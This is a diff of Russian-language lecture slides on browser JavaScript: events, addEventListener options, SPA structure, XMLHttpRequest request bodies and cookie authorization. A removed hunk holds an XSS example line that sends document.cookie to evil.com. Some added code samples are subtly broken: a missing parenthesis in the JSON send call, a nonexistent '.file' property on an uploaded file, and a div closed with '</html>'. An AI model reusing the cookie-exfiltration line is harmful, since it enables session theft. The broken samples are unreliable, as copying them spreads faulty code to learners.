@@ -27,6 +27,25 @@
 </section>
 
 <section class="slide">
+	<h2>Использование библиотек</h2>
+	<p class="small-content">В разработке семестрового проекта запрещены любые <mark>клиентские</mark> библиотеки. На сервере можно использовать всё, что угодно</p>
+</section>
+
+<section class="slide">
+	<h2>Кроссплатформенность и <br>кроссбраузерность</h2>
+	<p class="small-content">В разработке проекта можно ориентироваться только на последние версии браузеров. Необходимо, чтобы ваш проект <mark>обязательно</mark> работал в Google Chrome и в мобильном Google Chrome. Остальные браузеры &mdash; по возможности 😄</p>
+</section>
+
+<section class="slide">
+	<h2>Практика и использование <br>примеров с лекций</h2>
+	<p class="small-content">Все практические примеры заливаются на git. Практика на лекциях демонстрирует самый простой подход к решению задач. Вам необходимо думать головой и пытаться сделать лучше, чем у нас. Мы всегда готовы помочь и дать совет, как это сделать наиболее хорошо.</p>
+</section>
+
+<section class="slide question">
+	<h2><span style="font-size: 65%; display: inline-block;">Итак, начнём!</span></h2>
+</section>
+
+<section class="slide">
 	<h2>Глобальные объекты и глобальная<br>область видимости</h2>
 	<blockquote>
 		<p class="small-content"><b>Глобальными</b> называют переменные и функции, которые не находятся внутри какой-то
@@ -408,6 +427,7 @@
 	<p>События на элементах управления:</p>
 	<ul lang="ru" style="margin-bottom: 5px;">
 		<li><code>submit</code> – посетитель отправил форму &lt;form></li>
+		<li><code>reset</code> – посетитель сбросил форму &lt;form></li>
 		<li><code>focus</code> – посетитель фокусируется на элементе, например нажимает на &lt;input></li>
 	</ul>
 	<p style="margin-top: 5px;">Клавиатурные события:</p>
@@ -415,6 +435,8 @@
 		<li><code>keydown</code> – когда посетитель нажимает клавишу</li>
 		<li><code>keyup</code> – когда посетитель отпускает клавишу</li>
 	</ul>
+	<p class="note"><a href="https://developer.mozilla.org/en-US/docs/Web/Events" target="_blank">Список всех браузерных
+		событий (~200 штук)</a></p>
 </section>
 
 <section class="slide">
@@ -462,7 +484,7 @@
 </section>
 
 <section class="slide">
-	<h2><code>addEventListener</code> и <code>removeEventListener</code></h2>
+	<h2><code style="background: transparent">addEventListener</code> и <code style="background: transparent">removeEventListener</code></h2>
 	<p class="medium-content"></p>
 	<pre>
 		<code>// добавление обработчика</code>
@@ -473,6 +495,8 @@
 		<code>element.removeEventListener(event, handler);</code>
 		<code> </code>
 	</pre>
+	<p class="note"><a href="https://developer.mozilla.org/ru/docs/Web/API/EventTarget/addEventListener"
+					   target="_blank">Подробнее про <code>addEventListener</code></a></p>
 </section>
 
 <section class="slide">
@@ -537,9 +561,9 @@
 	<h2>Фазы обработки событий</h2>
 	<p class="medium-content"><strong>Строго говоря</strong>, стандарт выделяет целых три стадии прохода события:</p>
 	<ul lang="ru">
-		<li>Событие сначала идет сверху вниз. Эта стадия называется <mark>«стадия перехвата»</mark> (capturing stage)</li>
-		<li>Событие достигло целевого элемента. Это &mdash; <mark>«стадия цели»</mark> (target stage)</li>
-		<li>После этого событие начинает всплывать. Это &mdash; <mark>«стадия всплытия»</mark> (bubbling stage)</li>
+		<li>Событие сначала идет сверху вниз. Эта стадия называется <mark>«стадия&nbsp;перехвата»</mark> (capturing stage)</li>
+		<li>Событие достигло целевого элемента. Это &mdash; <mark>«стадия&nbsp;цели»</mark> (target stage)</li>
+		<li>После этого событие начинает всплывать. Это &mdash; <mark>«стадия&nbsp;всплытия»</mark> (bubbling stage)</li>
 	</ul>
 </section>
 
@@ -576,14 +600,40 @@
 </section>
 
 <section class="slide">
+	<h2>Более гибкое добавление <br>обработчиков</h2>
+	<p>В современных браузерах в третьем аргументе <code>addEventListener</code> можно передавать объект с настройками</p>
+	<pre>
+		<code>// добавление обработчика</code>
+		<code>element.addEventListener(event, handler, options);</code>
+		<code> </code>
+		<code>// <strong>options.capture</strong> - перехват события по дороге вниз</code>
+		<code>// <strong>options.once</strong> - обработчик будет вызван только один раз</code>
+		<code>// <strong>options.passive</strong> - говорит браузеру, что внутри обработчика не будет</code>
+		<code>//                   вызова <strong>preventDefault</strong></code>
+		<code> </code>
+		<code>// при удалении нужно передать те же аргументы</code>
+		<code>element.removeEventListener(event, handler, options);</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
 	<h2>SPA &mdash; Single Page Application</h2>
 	<blockquote>
-		<p class="small-content"><b>Одностраничное приложение (SPA)</b> &mdash; это веб-приложение, использующее
+		<p class="medium-content"><b>Одностраничное приложение (SPA)</b> &mdash; это веб-приложение, использующее
 			единственный HTML-документ как оболочку для всех веб-страниц и организующий взаимодействие с пользователем
 			через динамически подгружаемые ресурсы и данные, обычно посредством AJAX</p>
 	</blockquote>
+	<pre class="hljs html">
+		<code>&lt;html></code>
+		<code>    &lt;head> ... &lt;/head></code>
+		<code>    &lt;body></code>
+		<code>        &lt;div id="application">&lt;/html></code>
+		<code>    &lt;/body></code>
+		<code>&lt;/html></code>
+		<code> </code>
+	</pre>
 </section>
-
 
 <section class="slide question">
 	<h2>Практика!</h2>
@@ -663,7 +713,7 @@
 	<pre class="hljs js">
 		<code>// 4. Если код ответа сервера не 200, то это ошибка</code>
 		<code>console.log(`Ответ от сервера: ${xhr.status} ${xhr.statusText}`);</code>
-		<code>if (+xhr.status === 200) {</code>
+		<code>if (xhr.status === 200) {</code>
 		<code>    console.log(xhr.responseText);</code>
 		<code>} else {</code>
 		<code>    console.error('Ошибка!')</code>
@@ -680,8 +730,55 @@
 		<code>xhr.open('POST', '/post', <mark>false</mark>);</code>
 		<code> </code>
 		<code>// Выставляем заголовок</code>
+		<code>xhr.<mark>setRequestHeader</mark>('Content-Type', 'text/plain; charset=utf-8');</code>
+		<code>xhr.send('Request payload');</code>
+		<code>// ждём ответа</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Отправка json в теле запроса</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>const xhr = new XMLHttpRequest();</code>
+		<code>xhr.open('POST', '/post', <mark>false</mark>);</code>
+		<code> </code>
+		<code>// Выставляем заголовок</code>
 		<code>xhr.<mark>setRequestHeader</mark>('Content-Type', 'application/json; charset=utf-8');</code>
-		<code>xhr.send(JSON.stringify({name: 'Alex'}));</code>
+		<code>xhr.send(JSON.stringify({name: 'Alex'});</code>
+		<code>// ждём ответа</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Отправка бинарных данных в теле запроса</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>const xhr = new XMLHttpRequest();</code>
+		<code>xhr.open('POST', '/post', <mark>false</mark>);</code>
+		<code> </code>
+		<code>const binary = new Uint8Array(1024 * 1024); // 1 MB данных</code>
+		<code>const blob = new Blob([binary], {type: 'application/octet-stream'});</code>
+		<code>xhr.send(blob);</code>
+		<code>// ждём ответа</code>
+		<code> </code>
+	</pre>
+</section>
+
+<section class="slide">
+	<h2>Отправка файлов в теле запроса</h2>
+	<p class="medium-content"></p>
+	<pre class="hljs js">
+		<code>const xhr = new XMLHttpRequest();</code>
+		<code>xhr.open('POST', '/post', <mark>false</mark>);</code>
+		<code> </code>
+		<code>const fileInput = document.querySelector('input[type=file]');</code>
+		<code>const file = fileInput.files[0].file;</code>
+		<code>const formdata = new FormData();</code>
+		<code>formdata.append('file', file);</code>
+		<code>xhr.send(formdata);</code>
 		<code>// ждём ответа</code>
 		<code> </code>
 	</pre>
@@ -765,40 +862,40 @@
 <section class="slide">
 	<h2>1 Клиент → Сервер</h2>
 	<pre class="hljs http">
-			<code>GET / HTTP/1.1</code>
-			<code>Host: example.com</code>
-			<code> </code>
-		</pre>
+		<code>GET / HTTP/1.1</code>
+		<code>Host: example.com</code>
+		<code> </code>
+	</pre>
 </section>
 
 <section class="slide">
 	<h2>2 Клиент ← Сервер</h2>
 	<pre class="hljs http">
-			<code>HTTP/1.1 200 OK</code>
-			<code><mark>Set-Cookie: name=value</mark></code>
-			<code>Content-Type: text/html</code>
-			<code> </code>
-		</pre>
+		<code>HTTP/1.1 200 OK</code>
+		<code><mark>Set-Cookie: name=value</mark></code>
+		<code>Content-Type: text/html</code>
+		<code> </code>
+	</pre>
 </section>
 
 <section class="slide">
 	<h2>3 Клиент → Сервер</h2>
 	<pre class="hljs http">
-			<code>GET / HTTP/1.1</code>
-			<code>Host: example.com</code>
-			<code><mark>Cookie: name=value</mark></code>
-			<code> </code>
-		</pre>
+		<code>GET / HTTP/1.1</code>
+		<code>Host: example.com</code>
+		<code><mark>Cookie: name=value</mark></code>
+		<code> </code>
+	</pre>
 </section>
 
 <section class="slide">
 	<h2>4 Клиент ← Сервер</h2>
 	<pre class="hljs http">
-			<code>HTTP/1.1 200 OK</code>
-			<code><mark>Set-Cookie: name=value2</mark></code>
-			<code>Content-Type: text/html</code>
-			<code> </code>
-		</pre>
+		<code>HTTP/1.1 200 OK</code>
+		<code><mark>Set-Cookie: name=value2</mark></code>
+		<code>Content-Type: text/html</code>
+		<code> </code>
+	</pre>
 </section>
 
 <section class="slide">
@@ -868,15 +965,15 @@
 </section>
 
 <section class="slide">
-	<h2><a href="http://en.wikipedia.org/wiki/Cross-site_scripting">Cross Site Scripting</a> (XSS)</h2>
-	<p class="small-content"></p>
-	<pre class="hljs js">
-		<code>(new Image()).src = 'http://evil.com/?cookie=' +</code>
-		<code>                    document.cookie;</code>
-	</pre>
+	<h2>Итого: авторизация через куки</h2>
+	<ul lang="ru">
+		<li><strong>Клиент не работает с куками</strong></li>
+		<li>При запуске приложения, отправляем запрос за текущим пользователем</li>
+		<li>Если <mark>на бекенд</mark> приходит запрос без кук &mdash; значит пользователь не авторизован, возвращаем 401</li>
+		<li>Если <mark>на бекенд</mark> приходит запрос c куками &mdash; значит пользователь авторизован, возвращаем 200</li>
+		<li>На <mark>клиенте</mark>, в зависимости от ответа сервера, рисуем либо профиль пользователя, либо форму авторизации</li>
+	</ul>
 </section>
-
-
 
 
 <section class="slide question">
